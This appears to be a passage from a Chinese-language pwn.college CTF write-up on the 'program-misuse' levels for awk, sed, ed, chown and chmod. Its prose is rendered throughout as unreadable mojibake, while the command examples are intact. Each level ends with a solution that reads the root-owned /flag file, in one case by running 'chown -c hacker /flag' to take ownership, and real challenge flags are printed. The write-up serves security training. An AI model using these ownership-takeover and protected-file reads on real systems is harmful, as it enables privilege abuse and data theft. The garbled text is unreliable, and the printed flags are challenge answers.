<li><code>-v</code>ÔºöÂÆö‰πâÂèòÈáèÔºå‰æãÂ¶Ç <code>-v var=value</code>„ÄÇ</li>
</ul>
<p>Âú® <code>awk</code> ‰∏≠ÔºåÂä®‰ΩúÊåá‰ª§ÊòØÂú®Ê®°ÂºèÂåπÈÖçÊàêÂäüÂêéÊâßË°åÁöÑÊìç‰Ωú„ÄÇÂÆÉÂèØ‰ª•ÊòØ‰∏Ä‰∏™ÁÆÄÂçïÁöÑÂä®‰ΩúÔºå‰πüÂèØ‰ª•ÊòØ‰∏Ä‰∏™Â§çÊùÇÁöÑÂä®‰ΩúÂùóÔºåÁî®Ëä±Êã¨Âè∑ <code>&#123;&#125;</code> Êã¨Ëµ∑Êù•„ÄÇ</p>
<p>‰ª•‰∏ãÊòØ‰∏Ä‰∫õÂ∏∏ËßÅÁöÑ <code>awk</code> Âä®‰ΩúÊåá‰ª§Ôºö</p>
<ol>
<li>
<p><strong>print</strong>ÔºöÊâìÂç∞ÂΩìÂâçË°åÊàñÊåáÂÆöÂ≠óÊÆµÁöÑÂÜÖÂÆπ„ÄÇ</p>
<pre class="line-numbers language-none"><code class="language-none">awk &#39;&#123; print &#125;&#39; file.txt
awk &#39;&#123; print $1, $2 &#125;&#39; file.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
</li>
<li>
<p><strong>assignment</strong>ÔºöËµãÂÄºÊìç‰ΩúÔºåÂ∞Ü‰∏Ä‰∏™ÂÄºËµãÁªôÂèòÈáè„ÄÇ</p>
<pre class="line-numbers language-none"><code class="language-none">awk &#39;&#123; x &#x3D; $1 + $2; print x &#125;&#39; file.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p><strong>if-else</strong>ÔºöÊù°‰ª∂ËØ≠Âè•ÔºåÊ†πÊçÆÊù°‰ª∂ÊâßË°å‰∏çÂêåÁöÑÊìç‰Ωú„ÄÇ</p>
<pre class="line-numbers language-none"><code class="language-none">awk &#39;&#123; if ($1 &gt; 10) print &quot;Greater&quot;; else print &quot;Smaller&quot; &#125;&#39; file.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p><strong>for</strong>ÔºöÂæ™ÁéØËØ≠Âè•ÔºåÂØπ‰∏ÄÁªÑÂÄºËøõË°åËø≠‰ª£Â§ÑÁêÜ„ÄÇ</p>
<pre class="line-numbers language-none"><code class="language-none">awk &#39;&#123; for (i &#x3D; 1; i &lt;&#x3D; NF; i++) print $i &#125;&#39; file.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p><strong>while</strong>ÔºöÂæ™ÁéØËØ≠Âè•ÔºåÊ†πÊçÆÊù°‰ª∂ÈáçÂ§çÊâßË°åÊìç‰Ωú„ÄÇ</p>
<pre class="line-numbers language-none"><code class="language-none">awk &#39;&#123; i &#x3D; 1; while (i &lt;&#x3D; NF) &#123; print $i; i++ &#125; &#125;&#39; file.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p><strong>split</strong>ÔºöÂ∞ÜÂ≠óÁ¨¶‰∏≤ÊãÜÂàÜ‰∏∫Êï∞ÁªÑ„ÄÇ</p>
<pre class="line-numbers language-none"><code class="language-none">awk &#39;&#123; split($0, arr, &quot;,&quot;); print arr[1] &#125;&#39; file.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p><strong>delete</strong>ÔºöÂà†Èô§Êï∞ÁªÑ‰∏≠ÁöÑÂÖÉÁ¥†„ÄÇ</p>
<pre class="line-numbers language-none"><code class="language-none">awk &#39;&#123; delete arr[$1] &#125;&#39; file.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p><strong>next</strong>ÔºöË∑≥ËøáÂΩìÂâçË°åÔºåÁªßÁª≠Â§ÑÁêÜ‰∏ã‰∏ÄË°å„ÄÇ</p>
<pre class="line-numbers language-none"><code class="language-none">awk &#39;&#123; if ($1 &#x3D;&#x3D; &quot;skip&quot;) next; print &#125;&#39; file.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p><strong>exit</strong>ÔºöÁ´ãÂç≥ÁªàÊ≠¢ <code>awk</code> ÁöÑÊâßË°å„ÄÇ</p>
<pre class="line-numbers language-none"><code class="language-none">awk &#39;&#123; if ($1 &#x3D;&#x3D; &quot;stop&quot;) exit; print &#125;&#39; file.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
</ol>
<p>Ëøô‰∫õÊòØ <code>awk</code> ‰∏≠Â∏∏ËßÅÁöÑÂä®‰ΩúÊåá‰ª§ÔºåÂèØ‰ª•Ê†πÊçÆÂÖ∑‰ΩìÁöÑÈúÄÊ±ÇÁºñÂÜôÂ§çÊùÇÁöÑ <code>awk</code> ËÑöÊú¨Êù•Â§ÑÁêÜÊñáÊú¨Êï∞ÊçÆ„ÄÇ</p>
<h4 id="Â∏∏ËßÅÁî®Ê≥ïÁ§∫‰æã"><a class="markdownIt-Anchor" href="#Â∏∏ËßÅÁî®Ê≥ïÁ§∫‰æã"></a> Â∏∏ËßÅÁî®Ê≥ïÁ§∫‰æã</h4>
<ol>
<li>
<h5 id="ÊâìÂç∞ÊåáÂÆöÂàó"><a class="markdownIt-Anchor" href="#ÊâìÂç∞ÊåáÂÆöÂàó"></a> <strong>ÊâìÂç∞ÊåáÂÆöÂàó</strong>Ôºö</h5>
<pre class="line-numbers language-none"><code class="language-none">awk &#39;&#123;print $1, $3&#125;&#39; file.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<h5 id="Ê†πÊçÆÊù°‰ª∂Á≠õÈÄâË°å"><a class="markdownIt-Anchor" href="#Ê†πÊçÆÊù°‰ª∂Á≠õÈÄâË°å"></a> <strong>Ê†πÊçÆÊù°‰ª∂Á≠õÈÄâË°å</strong>Ôºö</h5>
<pre class="line-numbers language-none"><code class="language-none">awk &#39;$3 &gt; 50&#39; file.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<h5 id="ÁªüËÆ°Ë°åÊï∞"><a class="markdownIt-Anchor" href="#ÁªüËÆ°Ë°åÊï∞"></a> <strong>ÁªüËÆ°Ë°åÊï∞</strong>Ôºö</h5>
<pre class="line-numbers language-none"><code class="language-none">awk &#39;END &#123;print NR&#125;&#39; file.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<h5 id="ËÆ°ÁÆóÂàóÁöÑÊÄªÂíå"><a class="markdownIt-Anchor" href="#ËÆ°ÁÆóÂàóÁöÑÊÄªÂíå"></a> <strong>ËÆ°ÁÆóÂàóÁöÑÊÄªÂíå</strong>Ôºö</h5>
<pre class="line-numbers language-none"><code class="language-none">awk &#39;&#123;sum +&#x3D; $1&#125; END &#123;print sum&#125;&#39; file.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<h5 id="ÊåáÂÆöÂ≠óÊÆµÂàÜÈöîÁ¨¶"><a class="markdownIt-Anchor" href="#ÊåáÂÆöÂ≠óÊÆµÂàÜÈöîÁ¨¶"></a> <strong>ÊåáÂÆöÂ≠óÊÆµÂàÜÈöîÁ¨¶</strong>Ôºö</h5>
<pre class="line-numbers language-none"><code class="language-none">awk -F, &#39;&#123;print $1&#125;&#39; file.csv<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<h5 id="‰ΩøÁî®-awk-ËÑöÊú¨Êñá‰ª∂"><a class="markdownIt-Anchor" href="#‰ΩøÁî®-awk-ËÑöÊú¨Êñá‰ª∂"></a> <strong>‰ΩøÁî® <code>awk</code> ËÑöÊú¨Êñá‰ª∂</strong>Ôºö</h5>
<pre class="line-numbers language-none"><code class="language-none">awk -f script.awk file.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<h5 id="ÂÆö‰πâÂèòÈáè"><a class="markdownIt-Anchor" href="#ÂÆö‰πâÂèòÈáè"></a> <strong>ÂÆö‰πâÂèòÈáè</strong>Ôºö</h5>
<pre class="line-numbers language-none"><code class="language-none">awk -v var&#x3D;10 &#39;&#123;print $1, var&#125;&#39; file.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
</ol>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">awk</span> <span class="token string">'&#123; print &#125;'</span> /flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="level35sed"><a class="markdownIt-Anchor" href="#level35sed"></a> level35(sed)</h3>
<p><code>sed</code> ÊòØ‰∏Ä‰∏™ÊµÅÁºñËæëÂô®Ôºå‰∏ªË¶ÅÁî®‰∫éÂØπÊñáÊú¨ËøõË°åÁºñËæë„ÄÅËΩ¨Êç¢ÂíåËøáÊª§„ÄÇÂÆÉÂèØ‰ª•ËØªÂèñÊñáÊú¨Êñá‰ª∂ÔºåÈÄêË°åÂ§ÑÁêÜÊñáÊú¨ÔºåÂπ∂Ê†πÊçÆÊåáÂÆöÁöÑÁºñËæëÂëΩ‰ª§ÂØπÊñáÊú¨ËøõË°å‰øÆÊîπ„ÄÇ‰ª•‰∏ãÊòØ‰∏Ä‰∫õÂ∏∏Áî®ÁöÑ <code>sed</code> Êåá‰ª§Ôºö</p>
<ol>
<li>
<p><strong>ÊõøÊç¢ÊñáÊú¨</strong>Ôºö<code>s/old/new/</code>ÔºåÂ∞ÜÊØè‰∏ÄË°å‰∏≠ÁöÑ <code>old</code> ÊõøÊç¢‰∏∫ <code>new</code>„ÄÇ</p>
<pre class="line-numbers language-none"><code class="language-none">sed &#39;s&#x2F;old&#x2F;new&#x2F;&#39; file.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p><strong>ÂÖ®Â±ÄÊõøÊç¢</strong>Ôºö<code>s/old/new/g</code>ÔºåÂ∞ÜÊØè‰∏ÄË°å‰∏≠ÁöÑÊâÄÊúâ <code>old</code> ÊõøÊç¢‰∏∫ <code>new</code>„ÄÇ</p>
<pre class="line-numbers language-none"><code class="language-none">sed &#39;s&#x2F;old&#x2F;new&#x2F;g&#39; file.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p><strong>Ë°åÂà†Èô§</strong>Ôºö<code>d</code>ÔºåÂà†Èô§ÂåπÈÖçÁöÑË°å„ÄÇ</p>
<pre class="line-numbers language-none"><code class="language-none">sed &#39;&#x2F;pattern&#x2F;d&#39; file.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p><strong>Ë°åÊâìÂç∞</strong>Ôºö<code>p</code>ÔºåÊâìÂç∞ÂåπÈÖçÁöÑË°å„ÄÇ</p>
<pre class="line-numbers language-none"><code class="language-none">sed -n &#39;&#x2F;pattern&#x2F;p&#39; file.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p><strong>Ë°åËøΩÂä†</strong>Ôºö<code>a</code>ÔºåÂú®ÂåπÈÖçË°åÂêéÊ∑ªÂä†Êñ∞Ë°å„ÄÇ</p>
<pre class="line-numbers language-none"><code class="language-none">sed &#39;&#x2F;pattern&#x2F;a new line&#39; file.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p><strong>Ë°åÊèíÂÖ•</strong>Ôºö<code>i</code>ÔºåÂú®ÂåπÈÖçË°åÂâçÊèíÂÖ•Êñ∞Ë°å„ÄÇ</p>
<pre class="line-numbers language-none"><code class="language-none">sed &#39;&#x2F;pattern&#x2F;i new line&#39; file.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p><strong>Ë°åÊõøÊç¢</strong>Ôºö<code>c</code>ÔºåÂ∞ÜÂåπÈÖçË°åÊõøÊç¢‰∏∫Êñ∞ÊñáÊú¨„ÄÇ</p>
<pre class="line-numbers language-none"><code class="language-none">sed &#39;&#x2F;pattern&#x2F;c new line&#39; file.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p><strong>ÊâìÂç∞Ë°åÂè∑</strong>Ôºö<code>=</code></p>
<pre class="line-numbers language-none"><code class="language-none">sed &#39;&#x3D;&#39; file.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p><strong>Âà†Èô§Á©∫Ë°å</strong>Ôºö<code>/^$/d</code>ÔºåÂà†Èô§Á©∫ÁôΩË°å„ÄÇ</p>
<pre class="line-numbers language-none"><code class="language-none">sed &#39;&#x2F;^$&#x2F;d&#39; file.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p><strong>Ê≠£ÂàôË°®ËææÂºè</strong>ÔºöÊîØÊåÅÊ≠£ÂàôË°®ËææÂºèËøõË°åÊ®°ÂºèÂåπÈÖçÂíåÊõøÊç¢„ÄÇ</p>
</li>
</ol>
<p>Ëøô‰∫õÊòØ <code>sed</code> ‰∏≠Â∏∏Áî®ÁöÑ‰∏Ä‰∫õÊåá‰ª§ÔºåÂèØ‰ª•Ê†πÊçÆÂÖ∑‰ΩìÁöÑÈúÄÊ±ÇÂíåÊñáÊú¨Êï∞ÊçÆÁºñÂÜôÂ§çÊùÇÁöÑ <code>sed</code> ËÑöÊú¨Êù•Â§ÑÁêÜÊñáÊú¨„ÄÇ</p>
<p><code>sed -n 'p' /flag </code></p>
<h3 id="level36ed"><a class="markdownIt-Anchor" href="#level36ed"></a> level36(ed)</h3>
<p><code>ed</code> ÊòØ‰∏Ä‰∏™ÊñáÊú¨ÁºñËæëÂô®ÔºåÂèØ‰ª•Âú®ÁªàÁ´Ø‰∏≠‰ª•Ë°å‰∏∫Âçï‰ΩçÂØπÊñáÊú¨Êñá‰ª∂ËøõË°åÁºñËæë„ÄÇËôΩÁÑ∂ <code>ed</code> ÁöÑ‰ΩøÁî®ÊñπÂºèÁõ∏ÂØπËæÉÂ§çÊùÇÔºå‰ΩÜÂÆÉÊòØ Unix Á≥ªÁªü‰∏≠ÊúÄÊó©ÁöÑÁºñËæëÂô®‰πã‰∏ÄÔºåÂØπ‰∫éÂú®Á∫ØÊñáÊú¨ÁªàÁ´ØÁéØÂ¢É‰∏ãËøõË°åÁºñËæëÊìç‰ΩúÈùûÂ∏∏ÊúâÁî®„ÄÇ‰ª•‰∏ãÊòØ‰∏Ä‰∫õÂ∏∏Áî®ÁöÑ <code>ed</code> Êåá‰ª§ÂíåÁî®Ê≥ïÔºö</p>
<ol>
<li>
<p><strong>ÊâìÂºÄÊñá‰ª∂</strong>ÔºöÊâìÂºÄ‰∏Ä‰∏™Êñá‰ª∂ËøõË°åÁºñËæë„ÄÇ</p>
<pre class="line-numbers language-none"><code class="language-none">ed filename<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p><strong>ÊèíÂÖ•ÊñáÊú¨</strong>ÔºöÂú®ÊåáÂÆöË°å‰πãÂêéÊèíÂÖ•ÊñáÊú¨„ÄÇ</p>
<pre class="line-numbers language-none"><code class="language-none">a
text to insert
.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p><strong>Ê∑ªÂä†ÊñáÊú¨</strong>ÔºöÂú®Êñá‰ª∂Êú´Â∞æÊ∑ªÂä†ÊñáÊú¨„ÄÇ</p>
<pre class="line-numbers language-none"><code class="language-none">a
text to append
.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p><strong>ÊõøÊç¢ÊñáÊú¨</strong>ÔºöÁî®Êñ∞ÊñáÊú¨ÊõøÊç¢ÊåáÂÆöË°åÁöÑÊñáÊú¨„ÄÇ</p>
<pre class="line-numbers language-none"><code class="language-none">s&#x2F;old&#x2F;new&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p><strong>Âà†Èô§Ë°å</strong>ÔºöÂà†Èô§ÊåáÂÆöË°å„ÄÇ</p>
<pre class="line-numbers language-none"><code class="language-none">d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p><strong>ÊòæÁ§∫Ë°å</strong>ÔºöÊòæÁ§∫ÊåáÂÆöË°åÁöÑÂÜÖÂÆπ„ÄÇ</p>
<pre class="line-numbers language-none"><code class="language-none">p<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p><strong>ÁßªÂä®ÂÖâÊ†á</strong>ÔºöÂ∞ÜÂÖâÊ†áÁßªÂä®Âà∞ÊåáÂÆöË°å„ÄÇ</p>
<pre class="line-numbers language-none"><code class="language-none">n<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p><strong>‰øùÂ≠òÈÄÄÂá∫</strong>Ôºö‰øùÂ≠ò‰øÆÊîπÂπ∂ÈÄÄÂá∫ÁºñËæëÂô®„ÄÇ</p>
<pre class="line-numbers language-none"><code class="language-none">wq<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p><strong>ÈÄÄÂá∫‰∏ç‰øùÂ≠ò</strong>ÔºöÊîæÂºÉ‰øÆÊîπÂπ∂ÈÄÄÂá∫ÁºñËæëÂô®„ÄÇ</p>
<pre class="line-numbers language-none"><code class="language-none">q<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p><strong>ÊòæÁ§∫Ë°åÂè∑</strong>ÔºöÊòæÁ§∫ÂΩìÂâçË°åÂè∑„ÄÇ</p>
<pre class="line-numbers language-none"><code class="language-none">&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p><strong>ÊèíÂÖ•ÂëΩ‰ª§</strong>ÔºöÂú®ÂΩìÂâçË°å‰πãÂâçÊèíÂÖ•‰∏ÄË°åÂëΩ‰ª§„ÄÇ</p>
<pre class="line-numbers language-none"><code class="language-none">i
command
.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p><strong>ÊâßË°åÂëΩ‰ª§</strong>ÔºöÊâßË°åÂΩìÂâçË°åÁöÑÂëΩ‰ª§„ÄÇ</p>
<pre class="line-numbers language-none"><code class="language-none">!<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
</ol>
<p>ËøôÁßç‰∏çÂ∏∏Áî®</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hacker@program-misuse~level36:/challenge$ ed /flag
<span class="token number">57</span>
p
pwn.college<span class="token punctuation">&#123;</span>oSLjpurQyv2NRFJmvTLXN49oRUm.0FO3EDLzczN0UzW<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="level37chown"><a class="markdownIt-Anchor" href="#level37chown"></a> level37(chown)</h3>
<p><code>chown</code> ÊòØ‰∏Ä‰∏™Áî®‰∫éÊõ¥ÊîπÊñá‰ª∂ÊàñÁõÆÂΩïÁöÑÊâÄÊúâËÄÖÁöÑÂëΩ‰ª§ÔºåÂÆÉÂèØ‰ª•‰øÆÊîπÊñá‰ª∂ÊàñÁõÆÂΩïÁöÑÊâÄÊúâËÄÖÂíåÊâÄÂ±ûÁî®Êà∑ÁªÑ„ÄÇ‰ª•‰∏ãÊòØ‰∏Ä‰∫õ <code>chown</code> ÂëΩ‰ª§ÁöÑÂ∏∏Áî®Áî®Ê≥ïÔºö</p>
<ol>
<li>
<p><strong>Êõ¥ÊîπÊñá‰ª∂ÊâÄÊúâËÄÖ</strong>ÔºöÂ∞ÜÊñá‰ª∂ÁöÑÊâÄÊúâËÄÖÊõ¥Êîπ‰∏∫ÊåáÂÆöÁöÑÁî®Êà∑„ÄÇ</p>
<pre class="line-numbers language-none"><code class="language-none">chown username filename<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p><strong>Êõ¥ÊîπÊñá‰ª∂ÊâÄÊúâËÄÖÂíåÊâÄÂ±ûÁªÑ</strong>ÔºöÂ∞ÜÊñá‰ª∂ÁöÑÊâÄÊúâËÄÖÂíåÊâÄÂ±ûÁªÑÂêåÊó∂Êõ¥Êîπ‰∏∫ÊåáÂÆöÁöÑÁî®Êà∑ÂíåÁªÑ„ÄÇ</p>
<pre class="line-numbers language-none"><code class="language-none">chown username:groupname filename<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p><strong>Êõ¥ÊîπÁõÆÂΩïÂèäÂÖ∂Â≠êÁõÆÂΩïÁöÑÊâÄÊúâËÄÖ</strong>Ôºö‰ΩøÁî® <code>-R</code> ÈÄâÈ°πÂèØ‰ª•ÈÄíÂΩíÊõ¥ÊîπÁõÆÂΩïÂèäÂÖ∂Â≠êÁõÆÂΩï‰∏≠ÊâÄÊúâÊñá‰ª∂ÁöÑÊâÄÊúâËÄÖ„ÄÇ</p>
<pre class="line-numbers language-none"><code class="language-none">chown -R username directory<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p><strong>‰ΩøÁî® UID Âíå GID Êõ¥ÊîπÊâÄÊúâËÄÖ</strong>ÔºöÂèØ‰ª•‰ΩøÁî®Áî®Êà∑ÁöÑ UID ÂíåÁªÑÁöÑ GID Êù•ÊåáÂÆöÊâÄÊúâËÄÖÂíåÁªÑÔºåËÄå‰∏çÊòØÁî®Êà∑ÂêçÂíåÁªÑÂêç„ÄÇ</p>
<pre class="line-numbers language-none"><code class="language-none">chown uid:gid filename<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p><strong>‰ªÖÊõ¥ÊîπÊñá‰ª∂ÁöÑÊâÄÂ±ûÁªÑ</strong>ÔºöÂ¶ÇÊûúÁúÅÁï•‰∫ÜÊâÄÊúâËÄÖÈÉ®ÂàÜÔºåÂàôÂè™Êõ¥ÊîπÊñá‰ª∂ÁöÑÊâÄÂ±ûÁªÑ„ÄÇ</p>
<pre class="line-numbers language-none"><code class="language-none">chown :groupname filename<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p><strong>‰ªÖÊõ¥ÊîπÁõÆÂΩïÁöÑÊâÄÊúâËÄÖÔºå‰ΩÜ‰∏çÊõ¥ÊîπÂ≠êÁõÆÂΩïÂíåÊñá‰ª∂ÁöÑÊâÄÊúâËÄÖ</strong>ÔºöÂØπ‰∫éÁõÆÂΩïÔºåÂèØ‰ª•‰ΩøÁî® <code>--reference</code> ÈÄâÈ°πÔºåÂ∞Ü‰∏Ä‰∏™ÁõÆÂΩïÁöÑÊâÄÊúâËÄÖÂíåÁªÑ‰ø°ÊÅØ‰Ωú‰∏∫ÂèÇËÄÉÔºåÂπ∂Â∫îÁî®Âà∞Âè¶‰∏Ä‰∏™ÁõÆÂΩï„ÄÇ</p>
<pre class="line-numbers language-none"><code class="language-none">chown --reference&#x3D;reference_file directory<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p><strong>‰ªÖÊõ¥ÊîπÊñá‰ª∂ÁöÑÊùÉÈôêËÄå‰∏çÊõ¥ÊîπÊâÄÊúâËÄÖ</strong>ÔºöÂèØ‰ª•‰ΩøÁî® <code>-v</code> ÈÄâÈ°πÊòæÁ§∫ËØ¶ÁªÜ‰ø°ÊÅØÔºåÂåÖÊã¨ÊØè‰∏™Êñá‰ª∂ÁöÑÊõ¥Êîπ„ÄÇ</p>
<pre class="line-numbers language-none"><code class="language-none">chown -v username filename<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p><strong>Êõ¥ÊîπÁ¨¶Âè∑ÈìæÊé•ÁöÑÊâÄÊúâËÄÖ</strong>ÔºöÈªòËÆ§ÊÉÖÂÜµ‰∏ãÔºå<code>chown</code> ‰∏ç‰ºöÊõ¥ÊîπÁ¨¶Âè∑ÈìæÊé•ÁöÑÊâÄÊúâËÄÖÔºå‰ΩÜÂèØ‰ª•‰ΩøÁî® <code>-h</code> ÈÄâÈ°πÊù•Êõ¥ÊîπÁ¨¶Âè∑ÈìæÊé•Êú¨Ë∫´ÁöÑÊâÄÊúâËÄÖ„ÄÇ</p>
<pre class="line-numbers language-none"><code class="language-none">chown -h username symlink<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
</ol>
<p>Ëøô‰∫õÊòØ <code>chown</code> ÂëΩ‰ª§ÁöÑ‰∏Ä‰∫õÂ∏∏Áî®Áî®Ê≥ïÔºåÂèØ‰ª•Ê†πÊçÆÂÖ∑‰ΩìÁöÑÈúÄÊ±ÇÈÄâÊã©ÂêàÈÄÇÁöÑÈÄâÈ°πÂíåÂèÇÊï∞„ÄÇ</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hacker@program-misuse~level37:/challenge$ <span class="token function">chown</span> <span class="token parameter variable">-c</span> hacker /flag
changed ownership of <span class="token string">'/flag'</span> from root to hacker
hacker@program-misuse~level37:/challenge$ <span class="token function">cat</span> /flag
pwn.college<span class="token punctuation">&#123;</span>8LnNaiS1CrzNHDD3_gzCrvxUFgY.0VO3EDLzczN0UzW<span class="token punctuation">&#125;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="level38chmod"><a class="markdownIt-Anchor" href="#level38chmod"></a> level38(chmod)</h3>
<p><code>chmod</code> ÊòØÁî®‰∫éÊõ¥ÊîπÊñá‰ª∂ÊàñÁõÆÂΩïÊùÉÈôêÁöÑÂëΩ‰ª§„ÄÇÂÆÉÂèØ‰ª•ÈÄöËøáÊåáÂÆöÊùÉÈôêÊ®°ÂºèÊù•‰øÆÊîπÊñá‰ª∂ÁöÑËØª„ÄÅÂÜô„ÄÅÊâßË°åÊùÉÈôêÔºå‰πüÂèØ‰ª•ÈÄöËøáÁ¨¶Âè∑ÊàñÊï∞Â≠óÂΩ¢ÂºèÊù•ËÆæÁΩÆÊùÉÈôê„ÄÇ‰ª•‰∏ãÊòØ‰∏Ä‰∫õÂ∏∏Áî®ÁöÑ <code>chmod</code> ÂëΩ‰ª§ÂíåÈÄâÈ°πÔºö</p>
<ol>
<li>
<p><strong>Âü∫Êú¨ËØ≠Ê≥ï</strong>Ôºö</p>
<pre class="line-numbers language-none"><code class="language-none">chmod [options] mode file(s)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p><strong>ËÆæÁΩÆÊùÉÈôê</strong>ÔºöÈÄöËøáÊï∞Â≠óÂΩ¢ÂºèËÆæÁΩÆÊùÉÈôê„ÄÇ</p>
<pre class="line-numbers language-none"><code class="language-none">chmod 755 file.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p><strong>Á¨¶Âè∑ÂΩ¢ÂºèËÆæÁΩÆÊùÉÈôê</strong>Ôºö</p>
<ul>
<li><code>u</code>ÔºöÊñá‰ª∂ÊâÄÊúâËÄÖ</li>
<li><code>g</code>ÔºöÊñá‰ª∂ÊâÄÂ±ûÁªÑ</li>
<li><code>o</code>ÔºöÂÖ∂‰ªñÁî®Êà∑</li>
<li><code>a</code>ÔºöÊâÄÊúâÁî®Êà∑</li>
</ul>
<pre class="line-numbers language-none"><code class="language-none">chmod u+x file.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p><strong>ÈÄíÂΩíËÆæÁΩÆÊùÉÈôê</strong>ÔºöÈÄöËøá <code>-R</code> ÈÄâÈ°πÈÄíÂΩíÂú∞Êõ¥ÊîπÁõÆÂΩïÂèäÂÖ∂Â≠êÁõÆÂΩïÁöÑÊùÉÈôê„ÄÇ</p>
<pre class="line-numbers language-none"><code class="language-none">chmod -R 755 directory<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p><strong>Ëµã‰∫àÊâÄÊúâÊùÉÈôê</strong>Ôºö</p>
<pre class="line-numbers language-none"><code class="language-none">chmod 777 file.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p><strong>ÂèñÊ∂àÁâπÂÆöÊùÉÈôê</strong>Ôºö</p>
<pre class="line-numbers language-none"><code class="language-none">chmod a-x file.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p><strong>‰ΩøÊñá‰ª∂ÂèØÊâßË°å</strong>Ôºö</p>
<pre class="line-numbers language-none"><code class="language-none">chmod +x script.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p><strong>ËÆæÁΩÆÁâπÊÆäÊùÉÈôê</strong>Ôºö</p>
<ul>
<li><code>setuid</code>ÔºàSUIDÔºâÔºöÂ∞ÜÊñá‰ª∂ÁöÑÊâßË°åÊùÉÈôêËÆæÁΩÆ‰∏∫ÊâÄÊúâËÄÖÁöÑÊùÉÈôê„ÄÇ</li>
<li><code>setgid</code>ÔºàSGIDÔºâÔºöÂ∞ÜÊñá‰ª∂ÁöÑÊâßË°åÊùÉÈôêËÆæÁΩÆ‰∏∫ÁªÑÁöÑÊùÉÈôê„ÄÇ</li>
<li><code>sticky</code>ÔºöËÆæÁΩÆÁõÆÂΩïÁöÑÁ≤òÊªû‰ΩçÔºåÈò≤Ê≠¢ÂÖ∂‰ªñÁî®Êà∑Âà†Èô§ÈùûËá™Â∑±ÁöÑÊñá‰ª∂„ÄÇ</li>
</ul>
